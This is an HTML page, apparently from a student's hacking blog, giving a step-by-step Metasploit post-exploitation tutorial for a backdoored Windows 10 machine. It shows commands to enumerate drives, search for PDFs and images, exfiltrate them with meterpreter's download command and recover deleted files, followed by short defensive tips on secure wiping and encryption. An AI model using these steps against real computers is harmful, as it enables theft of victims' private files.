@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="shortcut icon" href="./assets/JamerBackground.png">
+    <title>Jamer</title>
+    <link rel="stylesheet" href="./css/all.css">
+    <link rel="stylesheet" href="./css/owl.carousel.min.css">
+    <link rel="stylesheet" href="./css/owl.theme.default.min.css">
+    <link rel="stylesheet" href="./css/aos.css">
+
+    <!-- Custom Style   -->
+    <script src="./js/scripts.js" defer></script>
+    <link rel="stylesheet" href="./css/USB-RUBBER-DUCKY.css">
+
+</head>
+
+<body>
+
+    <!--Navigation-->
+
+    <header class="navigation">
+        <a href="#" class="nav__trigger"><span class="nav__icon"></span></a>
+        <nav class="nav">
+            <ul class="nav__list">
+                <li class="nav__item"><span class="my-name">Jamer</span></li>
+                <li class="nav__item"><a class="nav__link" href="../../index.html">Home</a></li>
+                <li class="nav__item"><a class="nav__link" href="../../blog.html">Blog</a></li>
+                <li class="nav__item"><a class="nav__link" href="#">Contact</a></li>
+                <li class="nav__item"><a class="nav__link" href="../../about.html">About</a></li>
+            </ul>
+        </nav>
+    </header>
+
+
+    <main>
+
+        <!--Site title-->
+        <section class="site-title">
+            <div class="site-background" data-aos="fade-up" data-aos-delay="100">
+                <h1>Find Sensitive & ‘Deleted’ Files Remotely</h1>
+
+            </div>
+        </section>
+
+        <!--Site title-->
+
+        <!--Site Content-->
+        <section class="container">
+            <div class="site-content">
+                <div class="posts">
+                    <div class="post-content" data-aos="zoom-in" data-aos-delay="200">
+                        <div class="post-image">
+                            <div>
+                                <img src="./assets/blog-site/FindSensitive.png" class="img" alt="blog1">
+                            </div>
+                            <br>
+                            <p>Deleted bank statements and private photos are still within an attacker’s grasp, so don’t think that emptying your recycling bin is enough to keep your files from coming back to life. It’s possible for a hacker to recover compromising
+                                files and images from a backdoored computer completely without the victim’s knowledge. Once a hacker has established a backdoor on a target computer, they can use Metasploit to do all kinds of things without ever being
+                                noticed. Post-exploitation attacks could be anything from stealing browser passwords to capturing screenshots and keystrokes. In this guide, we’ll just be focusing on how a hacker could get important files from a backdoored
+                                Windows 10 system remotely. Before diving into the primary C: drive for interesting files, attackers may want to enumerate USB flash drives and other external drives connected to the computer. Data moving between the compromised
+                                computer and other devices may help attackers enumerate activity and operating systems available to the victim. Looking at external drives would also aid attackers in pivoting to other devices. For example, replacing files
+                                on a USB drive with malicious payloads and waiting for them to be opened on another computer would allow attackers to jump between computers, effectively hacking multiple computers accessed by the victim.
+                            </p>
+                        </div>
+                        <div class="post-title">
+                            <br>
+                            <br>
+                            <br>
+                            <a>
+                                Step 1 -Find Connected USBs & External Hard Drives
+                            </a>
+                            <hr>
+                            <br>
+                            <p>To enumerate USBs and external hard drives connected to the compromised computer, use the enum_drives Metasploit module in the meterpreter to display drive letters and their respective sizes. </p>
+                            <br>
+                            <br>
+                            <hr>
+                            <a class="setup">
+                                Command: <h4>$ run post/windows/gather/forensics/enum_drives</h4>
+                            </a>
+                            <p>The available module options can be viewed using the options command.</p>
+                        </div>
+                        <div class="post-image">
+                            <div>
+                                <img src="./assets/blog-site/blog-images/command1.jpg" class="img" alt="blog1">
+                            </div>
+                        </div>
+                        <div class="post-title">
+                            <p>Next, a SESSION ID will need to be specified in the module options. The sessions command can be used to view the available compromised devices. </p>
+                            <br>
+                            <br>
+                            <hr>
+                            <a class="setup">
+                                Command: <h4>$ session</h4>
+                            </a>
+                        </div>
+                        <div class="post-image">
+                            <div>
+                                <img src="./assets/blog-site/blog-images/session.jpg" class="img" alt="blog1">
+                            </div>
+                        </div>
+                        <div class="post-title">
+                            <p>Set the SESSION ID using the below command. </p>
+                            <br>
+                            <p>Then, use the run command to start the module. As we can see in the below image, there are several drives connected to the computer. </p>
+                        </div>
+                        <div class="post-image">
+                            <div>
+                                <img src="./assets/blog-site/blog-images/run.jpg" class="img" alt="blog1">
+                            </div>
+                        </div>
+                        <div class="post-title">
+                            <br>
+                            <br>
+                            <br>
+                            <a>
+                                Step 2- Search Hard Drives for Files
+                            </a>
+                            <hr>
+                            <br>
+                            <p>Using the search command, it’s possible to find files on the computer. The -h argument can be used to view the available search options.
+                            </p>
+                        </div>
+                        <div class="post-image">
+                            <div>
+                                <img src="./assets/blog-site/blog-images/search-hard-drives-for-files.jpg" class="img" alt="blog1">
+                            </div>
+                        </div>
+                        <div class="post-title">
+                            <p>To remotely search the E: drive, in my case, a USB flash drive, connected to the compromised computer for PDF files, the below command can be used.</p>
+                            <br>
+                            <br>
+                            <hr>
+                            <a class="setup">
+                                Command: <h4>$ search -d E: -f *.pdf</h4>
+                            </a>
+                        </div>
+                        <div class="post-image">
+                            <div>
+                                <img src="./assets/blog-site/blog-images/search-hard-drives-for-files.jpg" class="img" alt="blog1">
+                            </div>
+                        </div>
+                        <div class="post-title">
+                            <p>The -d argument specifies the drive letter to search, while the -f and wildcard (*) instructs the search command to find any file with the PDF filetype extension. In my example, there are two PDF files on the E: drive, found
+                                in the “Work” directory. To exfiltrate files from the victim’s computer, the below download command can be used. Single quotes (‘) encasing the path to the desired file are required, otherwise, the download will not be
+                                able to find the target file and fail.
+                            </p>
+                            <br>
+                            <br>
+                            <hr>
+                            <a class="setup">
+                                Command: <h4>$ download ‘E:\path\to\file.pdf’</h4>
+                            </a>
+                        </div>
+                        <div class="post-image">
+                            <div>
+                                <img src="./assets/blog-site/blog-images/DL-FILE.jpg" class="img" alt="blog1">
+                            </div>
+                        </div>
+                        <div class="post-title">
+                            <p>Similarly, to find JPEG images, attackers would use the below command.</p>
+                            <br>
+                            <br>
+                            <hr>
+                            <a class="setup">
+                                Command: <h4>$ search -d E: -f *.jpeg</h4>
+                            </a>
+                        </div>
+                        <div class="post-image">
+                            <div>
+                                <img src="./assets/blog-site/blog-images/search-2.jpg" class="img" alt="blog1">
+                            </div>
+                        </div>
+                        <div class="post-title">
+                            <p>In my example, only three JPEG images were found on the USB drive. Using the download command again to exfiltrate the data and viewing the photo reveals just a cat in the image. However, these may not be the only PDFs and images
+                                ever saved to the USB drive. It may be possible to recover files which have been recently deleted, which I’ll cover in the next step.</p>
+                        </div>
+                        <div class="post-image">
+                            <div>
+                                <img src="./assets/blog-site/blog-images/cat.jpg" class="img" alt="blog1">
+                            </div>
+                        </div>
+                        <div class="post-title">
+                            <br>
+                            <br>
+                            <br>
+                            <a>
+                                Step 3 -Find & Recover ‘Deleted’ Files
+                            </a>
+                            <hr>
+                            <br>
+                            <p>When files are removed from the Recycle Bin in Windows, they’re not actually deleted for good. It’s possible to dive deeper into the drive and recover the previously “deleted” files.
+                            </p>
+                            <br>
+                            <p>The recovery_files module can be used if SYSTEM (or elevated privileges) has been achieved during post-exploitation. An elevated process would mean the attacker was able to trick the victim into opening a payload with administrator
+                                privileges or managed to exploit a vulnerability in Windows 10 to gain more control over the computer. To use the recovery_files module, type the below command.
+                            </p>
+                            <br>
+                            <a class="setup">
+                                Command: <h4>$ use post/windows/gather/forensics/recovery_files</h4>
+                            </a>
+
+                        </div>
+                        <div class="post-image">
+                            <div>
+                                <img src="./assets/blog-site/blog-images/forensicsjpg.jpg" class="img" alt="blog1">
+                            </div>
+                        </div>
+                        <div class="post-title">
+                            <p>Set the DRIVE option to the specified target hard drive. In my case, the E: drive is being investigated. The below command can be used to set the target drive letter.</p>
+                            <br>
+                            <br>
+                            <hr>
+                            <a class="setup">
+                                Command: <h4>$ set DRIVE E:</h4>
+                            </a>
+                            <p>The FILES option, if left blank, will instruct the recovery_files module to simply print the recently deleted files. The SESSION option would also need to be set, as shown above in Step</p>
+                        </div>
+                        <div class="post-image">
+                            <div>
+                                <img src="./assets/blog-site/blog-images/result1.jpg" class="img" alt="blog1">
+                            </div>
+                        </div>
+                        <div class="post-title">
+                            <p>You can see above that there are three JPEGs found on the drive I’m investigating that are not currently accessible using the Windows file manager. These three images were believed (by the victim) to be deleted and no longer
+                                accessible. <br><br>To recover individual files, take note of the “ID” assigned to each file.</p>
+                        </div>
+                        <div class="post-image">
+                            <div>
+                                <img src="./assets/blog-site/blog-images/result2.jpg" class="img" alt="blog1">
+                            </div>
+                        </div>
+                        <div class="post-title">
+                            <p>The ID needs to be set within the options of the module. This can be done with the below command.</p>
+                            <br>
+                            <br>
+                            <hr>
+                            <a class="setup">
+                                Command: <h4>$ set FILES IdNumberHere</h4>
+                            </a>
+                        </div>
+                        <div class="post-image">
+                            <div>
+                                <img src="./assets/blog-site/blog-images/result3.jpg" class="img" alt="blog1">
+                            </div>
+                        </div>
+                        <div class="post-title">
+                            <p>Deleted files recovered from the drive would be automatically saved to the /root/.msf4/loot/ directory as a BIN file. Using the mv command to rename them will make the images viewable by double-clicking on them.</p>
+                            <br>
+                            <br>
+                            <hr>
+                            <a class="setup">
+                                Command: <h4>$ mv /root/.msf4/loot/filename.bin /tmp/image1.jpeg</h4>
+                            </a>
+                        </div>
+                        <div class="post-image">
+                            <div>
+                                <img src="./assets/blog-site/blog-images/result5.jpg" class="img" alt="blog1">
+                            </div>
+                        </div>
+                        <div class="post-title">
+                            <p>Viewing the JPEG shows a much more compromising image the victim believed was permanently deleted from the hard drive.</p>
+                            <a>How to Protect Yourself Against File Recovery Attacks</a>
+                            <p>I’ve just shown how easy it is for a hacker to gain access to your highly sensitive and supposedly deleted files, as long as they have a backdoor implemented on your computer. Now, what can you do to prevent this information
+                                from being extracted? The first line of defense is to make sure you’re not backdoored in the first place, as it becomes increasingly difficult to prevent an attacker from doing anything once they have access to your system.
+                                Other things you can do include …
+                            </p>
+                            <br>
+                            <ul>
+                                <li>
+                                    <p>
+                                        <b>Securely wiping hard drives.</b> Free software like CCleaner offers secure wipe solutions which allow users to permanently scrub deleted files from a drive. This will help prevent attackers from discovering sensitive
+                                        files stored on a USB drive or other drive.
+                                    </p>
+                                </li>
+                                <li>
+                                    <p>
+                                        <b>Securely erasing the file itself.</b> Microsoft has a tool called SDelete that can be used to delete individual files if you don’t want to wipe an entire drive to get rid of the information.
+                                    </p>
+                                </li>
+                                <li>
+                                    <p>
+                                        <b>Using encryption.</b> Encrypting sensitive files may help minimize the scale of the damage inflicted by such attacks. If an attacker backdoors a computer, they will likely be able to capture keystrokes and decrypt
+                                        passwords, in addition to recovering deleted files. However, using encryption may make it more difficult for the attacker and make the recovered data less worth their time.
+                                    </p>
+                                </li>
+                            </ul>
+
+                        </div>
+                    </div>
+                    <!---->
+                    <div class="pagination flex-row">
+                        <a href="../../blog.html" class="pages">Back</a>
+                    </div>
+                </div>
+
+                <!---->
+                <aside class="sidebar">
+                    <div class="category">
+                        <h2>Category</h2>
+                        <ul class="category-list">
+                            <li class="list-items" data-aos="fade-left" data-aos-delay="100">
+                                <a href="#">Android Tricks</a>
+                            </li>
+                            <li class="list-items" data-aos="fade-left" data-aos-delay="200">
+                                <a href="#">Linux</a>
+                            </li>
+                            <li class="list-items" data-aos="fade-left" data-aos-delay="300">
+                                <a href="#">Windows Tricks</a>
+                            </li>
+                            <li class="list-items" data-aos="fade-left" data-aos-delay="400">
+                                <a href="#">Networking</a>
+                            </li>
+                            <li class="list-items" data-aos="fade-left" data-aos-delay="500">
+                                <a href="#">Iphone Tricks</a>
+                            </li>
+                        </ul>
+                    </div>
+                    <div class="popular-post">
+                        <h2>Popular Post</h2>
+                        <div class="post-content" data-aos="flip-up" data-aos-delay="600">
+                            <div class="post-image">
+                                <div>
+                                    <img src="./assets/blog-site/blog-images/Termux.png" class="img" alt="blog1">
+                                </div>
+
+                            </div>
+                            <div class="post-title">
+                                <a href="#">Termux !! Full Tutorial With Termux commands</a>
+                            </div>
+
+                            <div class="post-content" data-aos="flip-up" data-aos-delay="300">
+                                <div class="post-image">
+                                    <div>
+                                        <img src="./assets/blog-site/blog-images/top-DDOS.png" class="img" alt="blog1">
+                                    </div>
+
+                                </div>
+                                <div class="post-title">
+                                    <a href="#">
+                                    Top DDoS Attack Tools</a>
+                                </div>
+                            </div>
+
+                            <div class="post-content" data-aos="flip-up" data-aos-delay="400">
+                                <div class="post-image">
+                                    <div>
+                                        <img src="./assets/blog-site/blog-images/slowloris.png" class="img" alt="blog1">
+                                    </div>
+
+                                </div>
+                                <div class="post-title">
+                                    <a href="#">
+                                    DDoS attack using SlowHTTPTest (Slowloris) in Kali Linux</a>
+                                </div>
+                            </div>
+                            <div class="post-content" data-aos="flip-up" data-aos-delay="500">
+                                <div class="post-image">
+                                    <div>
+                                        <img src="./assets/blog-site/blog-images/SSH.jpg" class="img" alt="blog1">
+                                    </div>
+
+                                </div>
+                                <div class="post-title">
+                                    <a href="#">
+                                    Use SSH Tunnels to Forward Requests & Access Remote Routers</a>
+                                </div>
+                            </div>
+                            <div class="post-content" data-aos="flip-up" data-aos-delay="200">
+
+                                <div class="post-image">
+                                    <div>
+                                        <img src="./assets/blog-site/blog-images/Android-Payload.jpg" class="img" alt="blog1">
+                                    </div>
+
+                                </div>
+                                <div class="post-title">
+                                    <a href="#">
+                                    Make a Persistent payload in Android Using Kali</a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="popular-tags">
+                        <h2>Popular Tags</h2>
+                        <div class="tags flex-row">
+                            <span class="tag" data-aos="flip-up" data-aos-delay="100">Software</span>
+                            <span class="tag" data-aos="flip-up" data-aos-delay="200">technology</span>
+                            <span class="tag" data-aos="flip-up" data-aos-delay="300">Programming</span>
+                            <span class="tag" data-aos="flip-up" data-aos-delay="400">Designing</span>
+                        </div>
+                    </div>
+                </aside>
+            </div>
+        </section>
+
+        <!--Site Content-->
+
+        <!--Footer-->
+        <footer>
+
+            <div class="container-footer-all ">
+
+                <div class="container-body ">
+
+                    <div class="colum1 ">
+                        <h1>This website is for my project and presentation</h1>
+
+                        <p>I just want to let you know that this website is for my project only at ITWS, I am not selling this because what I am selling is myself. But if you want to see the source code visit my github repository just don't be shy </p>
+
+                    </div>
+
+
+                    <div class="colum3 ">
+
+                        <h1>Information Contacts</h1>
+
+                        <div class="row2 ">
+                            <img src="icon/house.png ">
+                            <label>Gen. Ricarte Llanera Nueva Ecija</label>
+                        </div>
+
+                        <div class="row2 ">
+                            <img src="icon/smartphone.png ">
+                            <label>+639777325694</label>
+                        </div>
+
+                        <div class="row2 ">
+                            <img src="icon/contact.png ">
+                            <label>jamerkelly09877@gmail.com</label>
+                        </div>
+
+                    </div>
+
+                </div>
+
+            </div>
+
+            <div class="container-footer ">
+                <div class="footer ">
+                    <div class="copyright ">
+                        | <a href=" ">© 2021</a>
+                    </div>
+                    <div class="move-up ">
+                        <span><i class="fas fa-arrow-circle-up fa-2x "></i></span>
+                    </div>
+                    <div class="information ">
+
+                        <div class="social text-gray ">
+                            <a href="https://facebook.com/jamer055 "><i class="fab fa-facebook-f "></i></a>
+                            <a href="https://instagram.com/jamer05.touppercase ">&nbsp;&nbsp;<i class="fab fa-instagram "></i></a>
+                            <a href="https://github.com/Jamer05 ">&nbsp;&nbsp;&nbsp;<i class="fab fa-github "></i></a>
+                            <a href="https://www.linkedin.com/in/hemerson-ramiro-jr-9b64301a2">&nbsp;&nbsp;&nbsp;<i class="fab fa-linkedin "></i></a>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+
+            </div>
+
+        </footer>
+
+        <!--Footer-->
+
+        <!-- Jquery Library file -->
+        <script src="./js/Jquery3.4.1.min.js "></script>
+
+        <!-- --------- Owl-Carousel js ------------------->
+        <script src="./js/owl.carousel.min.js "></script>
+
+        <!-- ------------ AOS js Library  ------------------------- -->
+        <script src="./js/aos.js "></script>
+
+        <!-- Custom Javascript file -->
+        <script src="./js/main.js "></script>
+</body>
+
+</html>
